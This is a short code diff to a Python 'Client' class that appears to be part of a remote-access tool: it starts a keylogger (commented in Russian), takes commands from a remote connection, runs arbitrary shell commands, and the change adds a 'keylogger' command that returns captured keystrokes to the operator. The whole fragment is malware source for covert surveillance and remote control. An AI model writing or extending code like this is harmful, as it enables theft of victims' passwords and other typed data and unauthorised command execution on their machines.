@@ -51,8 +51,8 @@ class Client:
             else:
                 break
         # запуск кейлоггера
-        self.logger = key_logger.KeyLogger()
-        res = self.logger.start()
+        self.keylogger = key_logger.KeyLogger()
+        res = self.keylogger.start()
         if res != None:
             print(res)
 
@@ -133,7 +133,9 @@ class Client:
                     case "clires":
                         self.send_json(commands.restart_client())
                         self.connection.close()
-                        exit()                        
+                        exit()
+                    case "keylogger":
+                        command_response = self.keylogger.get_keylogs()
                     case _:
                         convCommand = self.arrayToString(command)
                         command_response = command_response = self.runCommand(convCommand).decode()
